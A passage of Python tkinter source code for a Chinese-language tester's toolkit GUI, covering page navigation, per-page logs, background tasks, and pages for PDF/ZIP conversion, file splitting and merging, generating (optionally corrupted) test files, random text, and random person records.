    def _select_menu(self, index):
        self._save_current_log()

        if self.content is not None:
            self.content.pack_forget()

        self._current_menu_index = index
        self._update_menu_highlight()
        self._log_owner = index
        self.title_label.config(text=self._page_title(index))

        frame = self._page_frames.get(index)
        if True:  # fix: 每次进入都重建页面，避免构建失败后缓存半成品导致重复控件堆叠
            frame = tk.Frame(self.page_container, bg="#f5f6fa")
            self._page_frames[index] = frame
            self.content = frame
            # 修复：页面构建中途失败后重进会重复堆叠控件（如生成页重复的输出路径行），每次进入前先清空旧内容
            for _w in list(frame.winfo_children()):
                _w.destroy()
        try:
                    if index == 0:
                        self._show_page_pdf()
                    elif index == 1:
                        self._show_page_zip()
                    elif index == 2:
                        self._show_page_split()
                    elif index == 3:
                        self._show_page_merge()
                    elif index == 4:
                        self._show_page_generate()
                    elif index == 5:
                        self._show_page_text()
                    elif index == 6:
                        self._show_page_person()
                    elif index == 7:
                        self._show_page_url()
                    elif index == 8:
                        # BUG-01: 页面构建异常时不能静默失败（否则界面控件显示不全且无提示）
                        try:
                            self._show_page_http()
                        except Exception:
                            # 完整堆栈写入程序同级日志文件，便于离线排查
                            try:
                                with open(os.path.join(_APP_DIR, "http_page_build_error.log"), "w", encoding="utf-8") as _ef:
                                    _ef.write(traceback.format_exc())
                            except Exception:
                                pass
                            self.after(0, lambda m="接口请求页面构建失败: " + traceback.format_exc().splitlines()[-1]: self._notify(m))
                    elif index == 9:
                        self._show_page_json()
                    elif index == 10:
                        self._show_page_jsondiff()
                    elif index == 11:
                        self._show_page_ocr_table()
                    elif index == 12:
                        self._show_page_about()
                    elif index == 13:
                        self._show_page_settings()
                    elif index == 14:
                        self._show_page_security()
        except Exception:
            _err = traceback.format_exc()
            try:
                with open(os.path.join(_APP_DIR, "page_build_error.log"), "a", encoding="utf-8") as _ef:
                    _ef.write("="*60 + "\n页面构建失败 index=" + str(index) + "\n" + _err + "\n")
            except Exception:
                pass
            self.after(0, lambda m="页面构建失败: " + _err.splitlines()[-1]: self._notify(m))
        else:
            self.content = frame

        frame.pack(fill="both", expand=True)
        try:
            self._apply_font_scale()
        except Exception:
            traceback.print_exc()
        try:
            self._restore_log()
        except Exception:
            traceback.print_exc()

    # ---------------- 日志 ----------------
    def _dev_log(self, level, msg):
        """后台日志：记录启动以来的所有日志信息（供关于页查看）"""
        try:
            import datetime
            ts = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
            self._dev_log_records.append((ts, level, msg.replace("\r", "")))
            if len(self._dev_log_records) > 5000:
                del self._dev_log_records[:1000]
        except Exception:
            pass

    def _save_current_log(self):
        if self._log_owner is None:
            return
        try:
            self.log.winfo_exists()
        except Exception:
            return
        if self._log_owner == self.ABOUT_PAGE_INDEX:
            # 关于页日志由 _log_global 统一维护，不走页面保存/过滤，避免全局日志被误删
            return
        content = self.log.get("1.0", "end-1c")
        # 过滤：各功能页日志只保留菜单操作产生的信息，剔除启动/加载/构建类信息（完整记录在关于页后台日志）
        _noise = ("[构建]", "迁移", "storage", "加载", "初始化", "[启动]")
        content = "\n".join(
            ln for ln in content.splitlines() if not any(k in ln for k in _noise))
        if content.strip():
            self._page_logs[self._log_owner] = content
        else:
            self._page_logs.pop(self._log_owner, None)

    def _restore_log(self):
        try:
            self.log.winfo_exists()
        except Exception:
            return
        self.log.config(state="normal")
        self.log.delete("1.0", "end")
        content = self._page_logs.get(self._log_owner)
        if content:
            for line in content.split("\n"):
                if "任务完成" in line:
                    self.log.insert("end", line + "\n", "ok")
                elif "任务失败" in line:
                    self.log.insert("end", line + "\n", "err")
                else:
                    self.log.insert("end", line + "\n")
            self.log.see("end")
        self.log.config(state="disabled")

    def _append_log_text(self, text):
        # 后台日志同步记录（所有界面日志的汇合点，供关于页查看）
        level = "DEBUG" if text and not text.endswith("\n") else "INFO"
        self._dev_log(level, text)
        """追加任务日志：当前显示的就是任务所属页面时写控件，否则写入该页存储"""
        if self._task_page is None or self._log_owner == self._task_page:
            self.log.insert("end", text)
            self.log.see("end")
            self._save_current_log()
        else:
            stored = self._page_logs.get(self._task_page, "")
            self._page_logs[self._task_page] = stored + text.replace("\r", "\n")

    def _log(self, text):
        self.log.config(state="normal")
        self._append_log_text(text)
        self.log.config(state="disabled")

    def _flush_log(self, data):
        if not data:
            return
        for chunk in data.split("\r"):
            if not chunk:
                continue
            if "\n" in chunk:
                # 进度行没有结尾换行，后到的普通日志需先补一个，
                # 否则两者会粘连成一行（如 "30%识别完成"）
                if getattr(self, "_progress_tail", False):
                    self._progress_tail = False
                    chunk = "\n" + chunk
                for line in chunk.split("\n"):
                    self._log(line + "\n")
            else:
                # \r 进度行：替换控件中的最后一行（无结尾换行，标记待补）
                self.log.config(state="normal")
                self.log.delete("end-1l", "end")
                self._append_log_text(chunk)
                self.log.config(state="disabled")
                self._progress_tail = True

    def _log_clear(self):
        """清空当前菜单的日志"""
        self.log.config(state="normal")
        self.log.delete("1.0", "end")
        self.log.config(state="disabled")
        if self._log_owner is not None:
            self._page_logs.pop(self._log_owner, None)

    def _log_export(self):
        """导出当前菜单的日志为txt文件"""
        if self._log_owner is None:
            self._notify("没有可导出的日志")
            return
        content = self._page_logs.get(self._log_owner)
        if not content or not content.strip():
            self._notify("当前菜单没有日志可导出")
            return
        f = filedialog.asksaveasfilename(
            title="导出日志",
            defaultextension=".txt",
            filetypes=[("文本文件", "*.txt"), ("所有文件", "*.*")],
            initialdir=_APP_DIR,
            initialfile=f"log_{self._log_owner}.txt")
        if not f:
            return
        try:
            with open(f, "w", encoding="utf-8") as fp:
                fp.write(content)
            self._notify(f"日志已导出到: {f}")
        except Exception as e:
            self._notify(f"导出日志失败: {e}")

    def _notify(self, text):
        """用日志代替弹窗提示"""
        self.log.config(state="normal")
        self._append_log_text(f"[提示] {text}\n")
        self.log.config(state="disabled")

    def _log_global(self, text):
        """全局日志：只写入"关于"页（启动/加载/后台检查等非单个功能的消息）"""
        idx = getattr(self, "ABOUT_PAGE_INDEX", 12)
        stored = self._page_logs.get(idx, "")
        self._page_logs[idx] = stored + text.replace("\r", "\n")
        # 若当前正显示关于页且其日志控件已构建，同步显示
        if self._log_owner == idx and hasattr(self, "log"):
            self.log.config(state="normal")
            self.log.insert("end", text)
            self.log.see("end")
            self.log.config(state="disabled")

    def _notify_global(self, text):
        """后台/启动类提示：只进"关于"页日志，不打扰当前功能页"""
        self._log_global(f"[提示] {text}\n")

    def _start_task(self, func, *args, on_done=None):
        if self._running:
            self._notify("有任务正在运行，请等待完成")
            return
        self._buffer = LogBuffer()
        self._task_page = self._current_menu_index
        self._save_current_log()
        self._page_logs.pop(self._current_menu_index, None)
        self.log.config(state="normal")
        self.log.delete("1.0", "end")
        self.log.config(state="disabled")
        self._running = True
        self._on_done = on_done
        self._result_box = []
        self._task_error = None
        self._loading_overlay.lift()

        def worker():
            try:
                # stdout+stderr 一并重定向：paddlex 等第三方库的关键日志多走 logging/stderr
                with contextlib.redirect_stdout(self._buffer), \
                        contextlib.redirect_stderr(self._buffer):
                    result = func(*args)
                self._result_box.append(result)
            except Exception as e:
                self._buffer.write(f"\n[错误] {e}\n[堆栈]\n{traceback.format_exc()}\n")
                self._task_error = e
                self._dev_log("ERROR", f"{e}\n{traceback.format_exc()}")

        self._task_thread = threading.Thread(target=worker, daemon=True)
        self._task_thread.start()
        self._poll_job = self.after(80, self._poll_log)

    def _poll_log(self):
        if not self._running:
            return
        self._flush_log(self._buffer.read_and_clear())
        if self._task_thread is not None and not self._task_thread.is_alive():
            self._finish_task()
            return
        self._poll_job = self.after(80, self._poll_log)

    def _finish_task(self):
        self._running = False
        self._loading_overlay.lower()
        if self._poll_job:
            self.after_cancel(self._poll_job)
            self._poll_job = None
        self._flush_log(self._buffer.read_and_clear())
        result = self._result_box[0] if self._result_box else None
        if self._task_error:
            result = None
            self._dev_log("ERROR", f"{self._task_error}\n{traceback.format_exc()}")
        self._task_thread = None
        if self._on_done:
            try:
                self._on_done(result)
            except tk.TclError:
                # 任务运行中用户切换了页面，回调涉及的控件已被销毁，忽略
                pass

    def _log_result_banner(self, ok):
        tag = "ok" if ok else "err"
        mark = "√" * 8 if ok else "×" * 8
        text = f" 任务完成 " if ok else " 任务失败 "
        self.log.config(state="normal")
        if self._task_page is None or self._log_owner == self._task_page:
            self.log.insert("end", f"\n{mark}{text}{mark}\n\n", tag)
            self.log.see("end")
            self._save_current_log()
        else:
            stored = self._page_logs.get(self._task_page, "")
            self._page_logs[self._task_page] = stored + f"\n{mark}{text}{mark}\n\n"
        self.log.config(state="disabled")

    def _on_done_success(self, result):
        self._log_result_banner(bool(result))

    # ---------------- 通用控件 ----------------
    def _label(self, parent, text):
        return tk.Label(parent, text=text, bg="#f5f6fa",
                        font=("Microsoft YaHei UI", 10))

    def _row(self, parent):
        row = tk.Frame(parent, bg="#f5f6fa")
        row.pack(fill="x", pady=5)
        return row

    # =============== 页面1: 图片转PDF ===============
    def _show_page_pdf(self):
        self.title_label.config(text="图片转 PDF")

        self._label(self.content, "选择多张图片，按顺序合并为一个 PDF 文件（每张图片一页）。").pack(anchor="w", pady=(0, 8))

        list_frame = tk.Frame(self.content, bg="#f5f6fa")
        list_frame.pack(fill="both", expand=True)

        self._pdf_listbox = tk.Listbox(list_frame, font=("Microsoft YaHei UI", 10))
        self._pdf_listbox.pack(side="left", fill="both", expand=True)

        btn_frame = tk.Frame(list_frame, bg="#f5f6fa")
        btn_frame.pack(side="left", fill="y", padx=(10, 0))
        tk.Button(btn_frame, text="添加图片", command=self._pdf_add, width=12).pack(pady=3)
        tk.Button(btn_frame, text="移除选中", command=self._pdf_remove, width=12).pack(pady=3)
        tk.Button(btn_frame, text="清空列表", command=self._pdf_clear, width=12).pack(pady=3)

        out_row = self._row(self.content)
        self._label(out_row, "输出路径:").pack(side="left")
        tk.Entry(out_row, textvariable=self._pdf_out_var).pack(
            side="left", padx=8, fill="x", expand=True)
        tk.Button(out_row, text="浏览", command=self._pdf_choose_out).pack(side="left")

        btn_row = self._row(self.content)
        tk.Button(btn_row, text="开始转换", command=self._pdf_convert,
                  bg="#1abc9c", fg="white",
                  font=("Microsoft YaHei UI", 11, "bold"), width=18).pack(pady=(6, 0))

    def _pdf_add(self):
        files = filedialog.askopenfilenames(title="选择图片", filetypes=IMAGE_EXTS)
        # BUG-09: 按绝对路径去重，重复选择（含取消后重选相同文件）不再累积重复项
        for f in files:
            f = os.path.abspath(f)
            if f in self._pdf_images:
                continue
            self._pdf_images.append(f)
            self._pdf_listbox.insert("end", os.path.basename(f))

    def _pdf_remove(self):
        sel = self._pdf_listbox.curselection()
        for i in reversed(sel):
            self._pdf_listbox.delete(i)
            del self._pdf_images[i]

    def _pdf_clear(self):
        self._pdf_listbox.delete(0, "end")
        self._pdf_images.clear()

    def _pdf_choose_out(self):
        d = filedialog.askdirectory(title="选择输出路径", initialdir=self._pdf_out_var.get())
        if d:
            self._pdf_out_var.set(d)

    def _pdf_convert(self):
        if not self._pdf_images:
            self._notify("请先添加图片")
            return
        out_dir = self._pdf_out_var.get().strip()
        if not out_dir:
            self._notify("请设置输出路径")
            return
        os.makedirs(out_dir, exist_ok=True)
        out = os.path.join(out_dir, "output.pdf")
        self._start_task(merge_images_to_pdf, list(self._pdf_images), out,
                         on_done=self._on_done_success)

    # =============== 页面2: 单图单PDF转ZIP ===============
    def _show_page_zip(self):
        self.title_label.config(text="单图单PDF转ZIP")

        self._label(self.content, "每张图片单独转换为一个 PDF，全部打包到一个 ZIP 压缩包中。").pack(anchor="w", pady=(0, 8))

        list_frame = tk.Frame(self.content, bg="#f5f6fa")
        list_frame.pack(fill="both", expand=True)

        self._zip_listbox = tk.Listbox(list_frame, font=("Microsoft YaHei UI", 10))
        self._zip_listbox.pack(side="left", fill="both", expand=True)

        btn_frame = tk.Frame(list_frame, bg="#f5f6fa")
        btn_frame.pack(side="left", fill="y", padx=(10, 0))
        tk.Button(btn_frame, text="添加图片", command=self._zip_add, width=12).pack(pady=3)
        tk.Button(btn_frame, text="移除选中", command=self._zip_remove, width=12).pack(pady=3)
        tk.Button(btn_frame, text="清空列表", command=self._zip_clear, width=12).pack(pady=3)

        out_row = self._row(self.content)
        self._label(out_row, "输出路径:").pack(side="left")
        tk.Entry(out_row, textvariable=self._zip_out_var).pack(
            side="left", padx=8, fill="x", expand=True)
        tk.Button(out_row, text="浏览", command=self._zip_choose_out).pack(side="left")

        btn_row = self._row(self.content)
        tk.Button(btn_row, text="开始转换", command=self._zip_convert,
                  bg="#1abc9c", fg="white",
                  font=("Microsoft YaHei UI", 11, "bold"), width=18).pack(pady=(6, 0))

    def _zip_add(self):
        files = filedialog.askopenfilenames(title="选择图片", filetypes=IMAGE_EXTS)
        # BUG-09: 同图片转PDF页，添加时按绝对路径去重，避免重复累积
        for f in files:
            f = os.path.abspath(f)
            if f in self._zip_images:
                continue
            self._zip_images.append(f)
            self._zip_listbox.insert("end", os.path.basename(f))

    def _zip_remove(self):
        sel = self._zip_listbox.curselection()
        for i in reversed(sel):
            self._zip_listbox.delete(i)
            del self._zip_images[i]

    def _zip_clear(self):
        self._zip_listbox.delete(0, "end")
        self._zip_images.clear()

    def _zip_choose_out(self):
        d = filedialog.askdirectory(title="选择输出路径", initialdir=self._zip_out_var.get())
        if d:
            self._zip_out_var.set(d)

    def _zip_convert(self):
        if not self._zip_images:
            self._notify("请先添加图片")
            return
        out_dir = self._zip_out_var.get().strip()
        if not out_dir:
            self._notify("请设置输出路径")
            return
        os.makedirs(out_dir, exist_ok=True)
        out = os.path.join(out_dir, "images_pdfs.zip")
        self._start_task(convert_images_to_zip, list(self._zip_images), out,
                         on_done=self._on_done_success)

    # =============== 页面3: 文件分割 ===============
    def _show_page_split(self):
        self.title_label.config(text="文件分割")
        self._label(self.content, "将一个文件按指定大小分割为多个 ZIP 文件。").pack(anchor="w", pady=(0, 8))

        r1 = self._row(self.content)
        self._label(r1, "输入文件:").pack(side="left")
        tk.Entry(r1, textvariable=self._split_in_var).pack(side="left", padx=8, fill="x", expand=True)
        tk.Button(r1, text="浏览", command=self._split_choose_in).pack(side="left")

        r2 = self._row(self.content)
        self._label(r2, "分片大小(MB):").pack(side="left")
        tk.Entry(r2, textvariable=self._split_size_var, width=12).pack(side="left", padx=8)

        r3 = self._row(self.content)
        self._label(r3, "输出路径:").pack(side="left")
        tk.Entry(r3, textvariable=self._split_out_var).pack(side="left", padx=8, fill="x", expand=True)
        tk.Button(r3, text="浏览", command=self._split_choose_out).pack(side="left")

        r4 = self._row(self.content)
        self._label(r4, "文件名前缀:").pack(side="left")
        tk.Entry(r4, textvariable=self._split_prefix_var, width=12).pack(side="left", padx=8)

        btn_row = self._row(self.content)
        tk.Button(btn_row, text="开始分割", command=self._split_run,
                  bg="#1abc9c", fg="white",
                  font=("Microsoft YaHei UI", 11, "bold"), width=18).pack(pady=(6, 0))

    def _split_choose_in(self):
        f = filedialog.askopenfilename(title="选择文件")
        if f:
            self._split_in_var.set(f)

    def _split_choose_out(self):
        d = filedialog.askdirectory(title="选择输出路径", initialdir=self._split_out_var.get())
        if d:
            self._split_out_var.set(d)

    def _split_run(self):
        f = self._split_in_var.get().strip()
        if not f or not os.path.exists(f):
            self._notify("请选择有效的输入文件")
            return
        try:
            size = float(self._split_size_var.get())
        except ValueError:
            self._notify("请输入有效的分片大小")
            return
        if size <= 0:
            self._notify("分片大小必须大于0")
            return
        out = self._split_out_var.get().strip()
        if not out:
            self._notify("请设置输出路径")
            return
        os.makedirs(out, exist_ok=True)
        self._start_task(split_to_zip, f, out, size,
                         self._split_prefix_var.get() or "part",
                         on_done=self._on_done_success)

    # =============== 页面4: 文件合并 ===============
    def _show_page_merge(self):
        self.title_label.config(text="文件合并")

        self._label(self.content, "选择分割生成的多个 ZIP 文件，合并还原为原始文件。").pack(anchor="w", pady=(0, 8))

        list_frame = tk.Frame(self.content, bg="#f5f6fa")
        list_frame.pack(fill="both", expand=True)

        self._merge_listbox = tk.Listbox(list_frame, font=("Microsoft YaHei UI", 10))
        self._merge_listbox.pack(side="left", fill="both", expand=True)

        btn_frame = tk.Frame(list_frame, bg="#f5f6fa")
        btn_frame.pack(side="left", fill="y", padx=(10, 0))
        tk.Button(btn_frame, text="添加ZIP", command=self._merge_add, width=12).pack(pady=3)
        tk.Button(btn_frame, text="移除选中", command=self._merge_remove, width=12).pack(pady=3)
        tk.Button(btn_frame, text="清空列表", command=self._merge_clear, width=12).pack(pady=3)

        out_row = self._row(self.content)
        self._label(out_row, "输出路径:").pack(side="left")
        tk.Entry(out_row, textvariable=self._merge_out_var).pack(side="left", padx=8, fill="x", expand=True)
        tk.Button(out_row, text="浏览", command=self._merge_choose_out).pack(side="left")

        btn_row = self._row(self.content)
        tk.Button(btn_row, text="开始合并", command=self._merge_run,
                  bg="#1abc9c", fg="white",
                  font=("Microsoft YaHei UI", 11, "bold"), width=18).pack(pady=(6, 0))

    def _merge_add(self):
        files = filedialog.askopenfilenames(title="选择ZIP文件", filetypes=[("ZIP文件", "*.zip")])
        for f in files:
            self._merge_files.append(f)
            self._merge_listbox.insert("end", os.path.basename(f))

    def _merge_remove(self):
        sel = self._merge_listbox.curselection()
        for i in reversed(sel):
            self._merge_listbox.delete(i)
            del self._merge_files[i]

    def _merge_clear(self):
        self._merge_listbox.delete(0, "end")
        self._merge_files.clear()

    def _merge_choose_out(self):
        d = filedialog.askdirectory(title="选择输出路径", initialdir=self._merge_out_var.get())
        if d:
            self._merge_out_var.set(d)

    def _merge_run(self):
        if not self._merge_files:
            self._notify("请先添加ZIP文件")
            return
        out_dir = self._merge_out_var.get().strip()
        if not out_dir:
            self._notify("请设置输出路径")
            return
        os.makedirs(out_dir, exist_ok=True)
        out = os.path.join(out_dir, "merged.bin")
        self._start_task(merge_zip_files, list(self._merge_files), out,
                         on_done=self._on_done_success)

    # =============== 页面5: 生成指定大小文件 ===============
    def _show_page_generate(self):
        self.title_label.config(text="生成指定大小文件")
        self._label(self.content, "生成指定大小和格式的文件（如 101MB 的 ZIP 文件）。").pack(anchor="w", pady=(0, 8))

        r1 = self._row(self.content)
        self._label(r1, "文件大小(MB):").pack(side="left")
        tk.Entry(r1, textvariable=self._gen_size_var, width=12).pack(side="left", padx=8)

        r2 = self._row(self.content)
        self._label(r2, "文件类型:").pack(side="left")
        self._gen_type_combo = ttk.Combobox(r2, textvariable=self._gen_type_var, state="readonly",
                     values=["docx", "jpg", "pdf", "plain", "png", "rar", "xlsx", "zip"], width=10)
        self._gen_type_combo.pack(side="left", padx=8)
        self._gen_type_combo.bind("<<ComboboxSelected>>", self._on_gen_type_changed)

        r4 = self._row(self.content)
        self._label(r4, "文件状态:").pack(side="left")
        self._gen_corrupt_combo = ttk.Combobox(r4, textvariable=self._gen_corrupt_var, state="readonly",
                     values=["正常", "损坏"], width=10)
        self._gen_corrupt_combo.pack(side="left", padx=8)
        self._gen_corrupt_combo.bind("<<ComboboxSelected>>", self._on_corrupt_changed)

        self._gen_corrupt_method_label = self._label(r4, "损坏方式:")
        self._gen_corrupt_method_combo = ttk.Combobox(r4, textvariable=self._gen_corrupt_method_var, state="readonly",
                     values=self._gen_methods_for_type(self._gen_type_var.get()), width=15)
        self._gen_corrupt_method_label.pack(side="left")
        self._gen_corrupt_method_combo.pack(side="left", padx=8)
        self._init_corrupt_tips()  # 悬浮说明：悬停下拉框显示当前损坏方式的中文释义
        # 输出路径与开始生成按钮（原被误放到 _hide_corrupt_tip 导致每次隐藏提示都重复创建）
        r3 = self._row(self.content)
        self._label(r3, "输出路径:").pack(side="left")
        tk.Entry(r3, textvariable=self._gen_out_var).pack(side="left", padx=8, fill="x", expand=True)
        tk.Button(r3, text="浏览", command=self._gen_choose_out).pack(side="left")

        btn_row = self._row(self.content)
        tk.Button(btn_row, text="开始生成", command=self._gen_run,
                  bg="#1abc9c", fg="white",
                  font=("Microsoft YaHei UI", 11, "bold"), width=18).pack(pady=(6, 0))
        self._on_corrupt_changed()
        self._on_gen_type_changed()

    def _init_corrupt_tips(self):
        """损坏方式下拉框的悬浮说明（悬停时显示当前选中方式的中文释义）"""
        self._CORRUPT_TIPS = {
            "header_tail": "覆盖头部和尾部：用随机数据改写文件开头和结尾各约4KB，破坏文件格式标识，文件无法正常打开",
            "header_only": "仅覆盖头部：只改写文件开头约4KB，破坏格式头信息（如ZIP/PDF魔数），文件大小不变",
            "tail_only": "仅覆盖尾部：只改写文件结尾约4KB，破坏文件结尾的校验/索引结构（如ZIP中央目录）",
            "random_positions": "随机位置覆盖：在文件中随机挑几处位置写入垃圾数据，局部损坏，部分内容可能仍可读",
            "full_random": "全部随机覆盖：整个文件内容全部替换为随机垃圾数据，完全不可恢复",
            "truncate": "截断文件：把文件砍掉一部分只剩前半段，文件变小，数据缺失",
            "zero_fill": "全部清零：整个文件内容全部写成0，大小不变但内容全空",
            "sig_only": "仅破坏文件头签名：只改写文件开头的魔数（如PNG的\x89PNG、RAR的Rar!），格式识别立即失败，其余数据保持不变",
        }
        self._corrupt_tip_win = None
        # 选中后在下拉框后面直接显示中文简述
        self._corrupt_tip_label = tk.Label(self._gen_corrupt_method_combo.master, text="", bg="#f5f6fa", fg="#555555",
                                           font=("Microsoft YaHei UI", 9))

        def _update_tip_label(_e=None):
            method = self._gen_corrupt_method_var.get()
            tip = self._CORRUPT_TIPS.get(method, "")
            self._corrupt_tip_label.config(text=tip.split("：")[0] if tip else "")
        self._corrupt_tip_label.pack(side="left", padx=(0, 8))
        self._update_corrupt_tip_label = _update_tip_label
        _update_tip_label()

        self._gen_corrupt_method_combo.bind("<<ComboboxSelected>>", _update_tip_label, add="+")
        _update_tip_label()
        self._gen_corrupt_method_combo.bind("<Enter>", self._show_corrupt_tip)
        self._gen_corrupt_method_combo.bind("<Leave>", self._hide_corrupt_tip)

    def _show_corrupt_tip(self, event=None):
        try:
            method = self._gen_corrupt_method_var.get()
            tip = self._CORRUPT_TIPS.get(method, method)
            self._hide_corrupt_tip()
            x = self.winfo_rootx() + self.winfo_pointerx() - self.winfo_rootx() + 16
            y = self.winfo_rooty() + self.winfo_pointery() - self.winfo_rooty() + 16
            self._corrupt_tip_win = tw = tk.Toplevel(self)
            tw.wm_overrideredirect(True)
            tw.wm_geometry(f"+{x}+{y}")
            tk.Label(tw, text=f"{method}: {tip}", bg="#ffffe0", fg="#333333",
                     relief="solid", borderwidth=1, justify="left", wraplength=380,
                     font=("Microsoft YaHei UI", 9), padx=6, pady=4).pack()
        except Exception:
            pass

    def _hide_corrupt_tip(self, event=None):
        try:
            if self._corrupt_tip_win is not None:
                self._corrupt_tip_win.destroy()
                self._corrupt_tip_win = None
        except Exception:
            self._corrupt_tip_win = None

    def _gen_methods_for_type(self, ftype):
        """按文件类型返回适用的损坏方式列表"""
        return TYPE_CORRUPT_METHODS.get(ftype, list(CORRUPT_METHODS.keys()))

    def _on_gen_type_changed(self, event=None):
        """文件类型变化时，损坏方式下拉项切换为该类型的常见损坏方式"""
        methods = self._gen_methods_for_type(self._gen_type_var.get())
        self._gen_corrupt_method_combo["values"] = methods
        if self._gen_corrupt_method_var.get() not in methods:
            self._gen_corrupt_method_var.set(methods[0])
        if hasattr(self, "_update_corrupt_tip_label"):
            self._update_corrupt_tip_label()

    def _on_corrupt_changed(self, event=None):
        if self._gen_corrupt_var.get() == "损坏":
            self._gen_corrupt_method_label.pack(side="left")
            self._gen_corrupt_method_combo.pack(side="left", padx=8)
            if hasattr(self, "_corrupt_tip_label"):
                self._corrupt_tip_label.pack(side="left", padx=(0, 8))
                if hasattr(self, "_update_corrupt_tip_label"):
                    self._update_corrupt_tip_label()
        else:
            self._gen_corrupt_method_combo.pack_forget()
            self._gen_corrupt_method_label.pack_forget()
            if hasattr(self, "_corrupt_tip_label"):
                self._corrupt_tip_label.pack_forget()

    def _gen_choose_out(self):
        d = filedialog.askdirectory(title="选择输出路径", initialdir=self._gen_out_var.get())
        if d:
            self._gen_out_var.set(d)

    def _gen_run(self):
        try:
            size = float(self._gen_size_var.get())
        except ValueError:
            self._notify("请输入有效的大小")
            return
        if size <= 0:
            self._notify("大小必须大于0")
            return
        ftype = self._gen_type_var.get()
        ext_map = {"zip": "zip", "plain": "bin", "pdf": "pdf", "docx": "docx", "xlsx": "xlsx",
                   "png": "png", "jpg": "jpg", "rar": "rar"}
        ext = ext_map.get(ftype, "bin")
        out_dir = self._gen_out_var.get().strip()
        if not out_dir:
            self._notify("请设置输出路径")
            return
        os.makedirs(out_dir, exist_ok=True)
        corrupted = self._gen_corrupt_var.get() == "损坏"
        corrupt_method = self._gen_corrupt_method_var.get() if corrupted else "header_tail"
        suffix = "_corrupted" if corrupted else ""
        out_file = os.path.join(out_dir, f"file_{size:g}{suffix}.{ext}")
        self._start_task(create_file, out_file, size, ftype, corrupted, corrupt_method,
                         on_done=self._on_done_success)

    # =============== 页面6: 生成指定长度文本 ===============
    def _show_page_text(self):
        self.title_label.config(text="生成指定长度文本")
        self._label(self.content, "输入长度和类型，生成对应长度的随机文本（可保存为txt）。").pack(anchor="w", pady=(0, 8))

        r1 = self._row(self.content)
        self._label(r1, "文本长度(字符):").pack(side="left")
        tk.Entry(r1, textvariable=self._text_len_var, width=12).pack(side="left", padx=8)

        r2 = self._row(self.content)
        self._label(r2, "类型:").pack(side="left")
        ttk.Combobox(r2, textvariable=self._text_type_var, state="readonly",
                     values=TEXT_TYPES, width=26).pack(side="left", padx=8)

        btn_row = self._row(self.content)
        tk.Button(btn_row, text="生成", command=self._text_run,
                  bg="#1abc9c", fg="white",
                  font=("Microsoft YaHei UI", 11, "bold"), width=16).pack(side="left", pady=(6, 0))
        tk.Button(btn_row, text="复制结果", command=self._text_copy, width=12).pack(side="left", padx=(10, 0))

        tk.Label(self.content, text="生成结果:", bg="#f5f6fa",
                 font=("Microsoft YaHei UI", 10)).pack(anchor="w", pady=(8, 3))

        self._text_result = tk.Text(self.content, height=8, font=("Consolas", 10),
                                    wrap="word", bg="white")
        self._text_result.pack(fill="both", expand=True)

    def _text_run(self):
        try:
            length = int(self._text_len_var.get())
        except ValueError:
            self._notify("请输入有效的长度")
            return
        if length < 1:
            self._notify("长度必须大于0")
            return
        text_type = self._text_type_var.get()
        self._text_result.delete("1.0", "end")
        self._text_result.insert("1.0", "正在生成...")
        self._start_task(self._text_generate, length, text_type,
                         on_done=self._text_done)

    def _text_generate(self, length, text_type):
        text = generate_text(length, text_type)
        print(f"已生成 {len(text)} 字符文本")
        return text

    def _text_done(self, result):
        if result:
            self._text_result.delete("1.0", "end")
            self._text_result.insert("1.0", result)
        else:
            self._text_result.delete("1.0", "end")
            self._log_result_banner(False)

    def _text_copy(self):
        text = self._text_result.get("1.0", "end-1c")
        if not text:
            self._notify("没有可复制的内容")
            return
        self.clipboard_clear()
        self.clipboard_append(text)
        self._notify("已复制到剪贴板")

    # =============== 页面7: 随机人员信息 ===============
    def _show_page_person(self):
        self.title_label.config(text="随机人员信息")
        self._label(self.content, "根据输入的年龄和性别，生成随机人员信息（身份证号、姓名、手机号、银行卡号等）。").pack(anchor="w", pady=(0, 8))

        r1 = self._row(self.content)
        self._label(r1, "年龄:").pack(side="left")
        self._person_age_var = tk.StringVar(value="30")
        tk.Entry(r1, textvariable=self._person_age_var, width=8).pack(side="left", padx=8)

        r2 = self._row(self.content)
        self._label(r2, "性别:").pack(side="left")
        self._person_gender_var = tk.StringVar(value="女")
        ttk.Combobox(r2, textvariable=self._person_gender_var, state="readonly",
                     values=["男", "女"], width=8).pack(side="left", padx=8)

        r3 = self._row(self.content)
        self._label(r3, "生成数量:").pack(side="left")
        self._person_count_var = tk.StringVar(value="5")
        tk.Entry(r3, textvariable=self._person_count_var, width=8).pack(side="left", padx=8)

        r4 = self._row(self.content)
        self._label(r4, "开户银行:").pack(side="left")
        self._person_bank_var = tk.StringVar(value="工商银行")
        ttk.Combobox(r4, textvariable=self._person_bank_var, state="readonly",
                     values=["工商银行", "建设银行", "农业银行", "中国银行"],
                     width=12).pack(side="left", padx=8)

        btn_row = self._row(self.content)
        tk.Button(btn_row, text="生成", command=self._person_run,
                  bg="#1abc9c", fg="white",
                  font=("Microsoft YaHei UI", 11, "bold"), width=16).pack(side="left", pady=(6, 0))
        tk.Button(btn_row, text="复制全部", command=self._person_copy, width=12).pack(side="left", padx=(10, 0))
        tk.Button(btn_row, text="导出Excel", command=self._person_export_excel, width=12).pack(side="left", padx=(10, 0))

        tk.Label(self.content, text="生成结果:", bg="#f5f6fa",
                 font=("Microsoft YaHei UI", 10)).pack(anchor="w", pady=(8, 3))

        self._person_result = tk.Text(self.content, height=10, font=("Consolas", 10),
                                      wrap="word", bg="white")
        self._person_result.pack(fill="both", expand=True)

    def _person_run(self):
        try:
            age = int(self._person_age_var.get())
        except ValueError:
            self._notify("请输入有效的年龄")
            return
        if age < 1 or age > 150:
            self._notify("年龄应在1-150之间")
            return

        gender = self._person_gender_var.get()
        bank_name = self._person_bank_var.get()

        try:
            count = int(self._person_count_var.get())
        except ValueError:
            self._notify("请输入有效的数量")
            return
        if count < 1 or count > 100:
            self._notify("数量应在1-100之间")
            return

        self._person_result.delete("1.0", "end")
        self._person_result.insert("1.0", "正在生成...")
        self._start_task(self._person_generate, age, gender, count, bank_name,
                         on_done=self._person_done)

    def _person_generate(self, age, gender, count, bank_name):
        headers = ["姓名", "性别", "年龄", "出生日期", "身份证号", "手机号", "银行卡号"]
        person_list = []

        for _ in range(count):
            person = generate_person(age, gender, bank_name)
            person_list.append(person)

        # 保存结构化数据用于复制和导出
        self._person_data = person_list

        # 生成显示文本（用Font.measure像素级精确对齐）
        import tkinter.font as tkfont
        _font = tkfont.Font(family="Consolas", size=10)

        def str_pixel_w(s):
            return _font.measure(str(s))

        def pad_px(s, target_px):
            s = str(s)
